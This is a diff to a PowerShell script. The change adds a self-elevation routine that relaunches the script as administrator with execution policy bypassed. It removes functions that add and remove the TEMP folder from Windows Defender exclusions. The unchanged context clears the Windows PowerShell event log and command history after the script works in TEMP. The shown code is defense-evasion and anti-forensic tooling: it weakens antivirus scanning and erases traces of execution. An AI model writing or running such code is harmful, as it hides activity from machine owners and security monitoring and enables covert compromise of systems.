@@ -1,3 +1,30 @@
+function Ensure-RunAsAdmin {
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    if (-not $isAdmin) {
+        Write-Host "Run not Administrator..."
+        
+        $scriptPath = $MyInvocation.MyCommand.Definition
+        $arguments = $args -join " " # Передаем аргументы в новом запуске
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "powershell.exe"
+        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $arguments"
+        $psi.Verb = "runas" # Запуск с правами администратора
+        
+        # Перезапускаем процесс
+        try {
+            [Diagnostics.Process]::Start($psi) | Out-Null
+            Exit
+        } catch {
+            Write-Error "Error runas for Administrator"
+            Exit 1
+        }
+    }
+}
+
+# Пример использования функции
+Ensure-RunAsAdmin
+
 function ClrHistory {
     try {
         Write-Host "Clearing logs and history..." -ForegroundColor Green
@@ -25,31 +52,6 @@ function ClrHistory {
     }
 }
 
-
-function AddToDefenderExclusions {
-    try {
-        $tempPath = $env:TEMP
-        Add-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
-    } catch {
-		Write-Host "Error DefenderExclusions" -ForegroundColor Red
-		Start-Sleep -s 1
-    }
-}
-
-function RemoveFromDefenderExclusions {
-    try {
-        $tempPath = $env:TEMP
-        Remove-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
-        Write-Host "Path successfully removed from Defender exclusions: $tempPath" -ForegroundColor Green
-    } catch {
-        Write-Host "Error removing Defender exclusion" -ForegroundColor Red
-        Start-Sleep -s 1
-    }
-}
-
-
-AddToDefenderExclusions
-
 Start-Sleep -s 1
 
 try {
@@ -57,8 +59,6 @@ try {
     Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
 } catch {
     Write-Host "Error clean log, please restart for Administrator" -ForegroundColor Red
-	Start-Sleep -s 3
-    exit
 }
 
 $temp = $env:TEMP
@@ -101,7 +101,6 @@ try {
 		Start-Sleep -s 3
     }
 } finally {
-	RemoveFromDefenderExclusions
     ClrHistory
 }
 
